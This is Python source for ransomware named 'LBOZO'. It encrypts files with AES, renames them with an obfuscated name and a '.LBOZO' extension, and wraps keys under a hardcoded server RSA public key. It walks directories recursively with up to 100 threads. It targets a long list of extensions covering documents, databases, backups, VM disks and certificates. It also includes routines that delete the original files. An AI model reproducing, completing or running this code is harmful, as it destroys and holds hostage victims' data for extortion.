from Crypto.Cipher import AES
from Crypto.Hash import SHA256
from pathlib import Path
import logging
import concurrent.futures
import os
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
from Crypto.PublicKey import RSA
import base64
import Crypto.Random

global keypath
keypath = "./keys/"

BLOCK_SIZE = 16
BLOCK_MULTIPLIER = 100

global ALPHABET
ALPHABET = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz.1234567890"

maxWorker = 100


def get_files(os_type):
    if os_type == "Windows":
        desktop = os.path.join(os.path.join(os.environ["USERPROFILE"]), "Desktop")


def encrypt_keyfile(Client_private_key, server_public_key):
    encrypt_key = RSA.import_key(server_public_key)
    cipher_rsa = PKCS1_OAEP.new(encrypt_key)
    n = 16  # chunk length
    chunks = [
        Client_private_key[i : i + n] for i in range(0, len(Client_private_key), n)
    ]
    final_encrypted = b""
    for i in chunks:
        encrypted_content = cipher_rsa.encrypt(i)
        final_encrypted += encrypted_content
    return final_encrypted


def decrypt_keyfile(encrypted_client_private_key, server_private_key):
    private_key = RSA.import_key(server_private_key)
    cipher_rsa = PKCS1_OAEP.new(private_key)
    encrypted_content = encrypted_client_private_key
    decrypted_content = cipher_rsa.decrypt(encrypted_content)
    return decrypted_content


def generateKey(length, key):
    retKey = str()
    for i in range(length):
        retKey += key[i % len(key)]
    return retKey


def vencrypt(msg, key):
    key = generateKey(len(msg), key)
    ciphertext = "E"
    for index, char in enumerate(msg):
        ciphertext += ALPHABET[
            (ALPHABET.find(key[index]) + ALPHABET.find(char)) % len(ALPHABET)
        ]
    return ciphertext


def vdecrypt(ciphertext, key):
    key = generateKey(len(ciphertext), key)
    msg = str()
    ciphertext = ciphertext[1:]
    for index, char in enumerate(ciphertext):
        msg += ALPHABET[
            (ALPHABET.find(char) - ALPHABET.find(key[index])) % len(ALPHABET)
        ]
    return msg


def encryptFile(filePath, password):
    try:
        logging.info("Started encoding: " + filePath.resolve().as_posix())
        hashObj = SHA256.new(password.encode("utf-8"))
        hkey = hashObj.digest()
        encryptPath = Path(
            filePath.parent.resolve().as_posix()
            + "/"
            + vencrypt(filePath.name, password)
            + ".LBOZO"
        )
        if encryptPath.exists():
            encryptPath.unlink()
        with open(filePath, "rb") as input_file, encryptPath.open("ab") as output_file:
            content = b""
            content = input_file.read(BLOCK_SIZE * BLOCK_MULTIPLIER)

            while content != b"":
                output_file.write(encrypt(hkey, content))
                content = input_file.read(BLOCK_SIZE * BLOCK_MULTIPLIER)

            logging.info("Encoded " + filePath.resolve().as_posix())
            logging.info("To " + encryptPath.resolve().as_posix())
    except Exception as e:
        print(e)


def decryptFile(filePath, password):
    logging.info("Started decoding: " + filePath.resolve().as_posix())
    try:
        hashObj = SHA256.new(password.encode("utf-8"))
        hkey = hashObj.digest()
        decryptFilePath = Path(
            filePath.parent.resolve().as_posix()
            + "/"
            + vdecrypt(filePath.name, password)[:-6]
        )
        if decryptFilePath.exists():
            decryptFilePath.unlink()
        with filePath.open("rb") as input_file, decryptFilePath.open(
            "ab"
        ) as output_file:
            values = input_file.read(BLOCK_SIZE * BLOCK_MULTIPLIER)
            while values != b"":
                output_file.write(decrypt(hkey, values))
                values = input_file.read(BLOCK_SIZE * BLOCK_MULTIPLIER)

        logging.info("Decoded: " + filePath.resolve().as_posix()[:-4])
        logging.info("TO: " + decryptFilePath.resolve().as_posix())

    except Exception as e:
        print(e)


def pad(msg, BLOCK_SIZE, PAD):
    return msg + PAD * ((BLOCK_SIZE - len(msg) % BLOCK_SIZE) % BLOCK_SIZE)


def encrypt(key, msg):
    PAD = b"\0"
    cipher = AES.new(key, AES.MODE_ECB)
    result = cipher.encrypt(pad(msg, BLOCK_SIZE, PAD))
    return result


def decrypt(key, msg):
    PAD = b"\0"
    decipher = AES.new(key, AES.MODE_ECB)
    pt = decipher.decrypt(msg)
    for i in range(len(pt) - 1, -1, -1):
        if pt[i] == PAD:
            pt = pt[:i]
        else:
            break
    return pt


def getMaxLen(arr):
    maxLen = 0
    for elem in arr:
        if len(elem) > maxLen:
            maxLen = len(elem)
    return maxLen


def getTargetFiles(fileExtension):
    fileExtensions = []
    if len(fileExtension) == 0:
        fileExtensions.append("*")
    else:
        for Extension in fileExtension:
            fileExtensionFormatted = "*."
            for char in Extension:
                fileExtensionFormatted += "[" + char + "]"
            fileExtensions.append(fileExtensionFormatted)

    return fileExtensions


def generateDecryptThreads(password, removeFiles, path):
    filePaths = list(Path(path).rglob("*.[lL][bB][oO][zZ][oO]"))
    with concurrent.futures.ThreadPoolExecutor(max_workers=maxWorker) as executor:
        for filePath in filePaths:
            executor.submit(decryptFile, *(filePath, password))
    if removeFiles:
        for filePath in filePaths:
            filePath.unlink()


def removeEncryptedFiles(path):
    filePaths = list(Path(path).rglob("*.[eE][nN][cC]"))
    for filePath in filePaths:
        filePath.unlink()


def removeExFiles(fileExtensions, path):
    fileExtensionFormatted = getTargetFiles(fileExtensions)
    filePaths = []
    for fileExtension in fileExtensionFormatted:
        filePaths = filePaths + list(Path(path).rglob(fileExtension))
    for filePath in filePaths:
        filePath.unlink()


def generate_keys():
    key = RSA.generate(2048)
    privatekey = key.export_key()
    with open(f"{keypath}private.pem", "wb") as file:
        file.write(privatekey)
    publickey = key.publickey().export_key()
    with open(f"{keypath}public.pem", "wb") as file:
        file.write(publickey)


def encrypt_priv_key(msg, key):
    n = 127
    x = [msg[i : i + n] for i in range(0, len(msg), n)]

    key = RSA.importKey(key)
    cipher = PKCS1_OAEP.new(key)
    encrypted = []
    for i in x:
        ciphertext = cipher.encrypt(i)
        encrypted.append(ciphertext)
    return encrypted


server_public_key = """-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAiTAUg6we9siwOP06O50/
xAr+4G34MlX9HligZG0qUTmPeBiHbyOQTYDQ74VER7XOFJpUYWAy9AV6hGXZRvIk
QYDt1MgSaxlQO/Lqdfe+NEpfa5tq7voLb38y8K0wYdgNs9GHgfCXu3tVb5D46pLf
xkLA44P9pbxCbT2IV6uizSZJ+qxxjVpmvDchJ7i9zRpaoWQLv5gwf8EaYt2iGHul
W7B2noLfLL0MK30Lho13BAKHzVPPT572EQWEge88rGrrgVJoTsx5E/n03QHOpTs8
Psxko+hSoD7ACKZGeDc6PxIMVF0eav3EQsiTa6n81e3Epzx5bCZcCekX5C8gtfaj
EwIDAQAB
-----END PUBLIC KEY-----"""

ransomware_path = os.path.expanduser("~") + "\LBOZO"

client_public_key_path = os.path.join(ransomware_path, "client_public_key.PEM")

encrypted_client_private_key_path = os.path.join(
    ransomware_path, "encrypted_client_private_key.key"
)

fileExtensions = [
    "AAC",
    "ADT",
    "ADTS",
    "ACCDB",
    "ACCDE",
    "ACCDR",
    "ACCDT",
    "AIF",
    "AIFC",
    "AIFF",
    "ASPX",
    "AVI",
    "BAT",
    "BIN",
    "BMP",
    "CAB",
    "CDA",
    "CSV",
    "DLL",
    "DOC",
    "DOCM",
    "DOCX",
    "DOT",
    "DOTX",
    "EML",
    "EPS",
    "EXE",
    "FLV",
    "GIF",
    "HTM",
    "HTML",
    "INI",
    "ISO",
    "JAR",
    "JPG",
    "JPEG",
    "M4A",
    "MDB",
    "MID",
    "MIDI",
    "MOV",
    "MP3",
    "MP4",
    "MPEG",
    "MPG",
    "MSI",
    "MUI",
    "PDF",
    "PNG",
    "POT",
    "POTM",
    "POTX",
    "PPAM",
    "PPS",
    "PPSM",
    "PPSX",
    "PPT",
    "PPTM",
    "PPTX",
    "PSD",
    "PST",
    "PUB",
    "RAR",
    "RTF",
    "SLDM",
    "SLDX",
    "SWF",
    "SYS",
    "TIF",
    "TIFF",
    "TMP",
    "TXT",
    "VOB",
    "VSD",
    "VSDM",
    "VSDX",
    "VSS",
    "VSSM",
    "VST",
    "VSTM",
    "VSTX",
    "WAV",
    "WBK",
    "WKS",
    "WMA",
    "WMD",
    "WMV",
    "WMZ",
    "WMS",
    "WPD",
    "WP5",
    "XLA",
    "XLL",
    "XLAM",
    "XLM",
    "XLS",
    "XLSM",
    "XLSX",
    "XLT",
    "XLTM",
    "XLTX",
    "XPS",
    "ZIP",
    "OST",
    "MSG",
    "WK1",
    "DWG",
    "ONETOC2",
    "SNT",
    "DOCB",
    "DOTM",
    "XLSB",
    "XLW",
    "XLC",
    "EDB",
    "HWP",
    "602",
    "SXI",
    "STI",
    "VDI",
    "VMDK",
    "VMX",
    "GPG",
    "AES",
    "ARC",
    "PAQ",
    "BZ2",
    "TBK",
    "JFIF",
    "BAK",
    "TAR",
    "TGZ",
    "GZ",
    "7Z",
    "BACKUP",
    "VCD",
    "RAW",
    "CGM",
    "NEF",
    "AI",
    "SVG",
    "DJVU",
    "M4U",
    "M3U",
    "3G2",
    "MKV",
    "3G",
    "ASF",
    "FLA",
    "SH",
    "CLASS",
    "JAVA",
    "RB",
    "PHP",
    "JSP",
    "BRD",
    "SCH",
    "DCH",
    "DIP",
    "PL",
    "VB",
    "VBS",
    "PS1",
    "CMD",
    "JS",
    "ASM",
    "H",
    "PAS",
    "CPP",
    "C",
    "CS",
    "SUO",
    "SLN",
    "LDF",
    "MDF",
    "IBD",
    "MYI",
    "MYD",
    "FRM",
    "ODB",
    "DBF",
    "DB",
    "SQL",
    "SQLITEDB",
    "SQLITE3",
    "ASC",
    "LAY6",
    "LAY",
    "MML",
    "SXM",
    "OTG",
    "ODG",
    "UOP",
    "STD",
    "SXD",
    "OTP",
    "ODP",
    "WB2",
    "SLK",
    "DIF",
    "STC",
    "SXC",
    "OTS",
    "ODS",
    "3DM",
    "MAX",
    "3DS",
    "UOT",
    "STW",
    "SXW",
    "OTT",
    "ODT",
    "P12",
    "CSR",
    "CRT",
    "PFX",
    "DER",
]
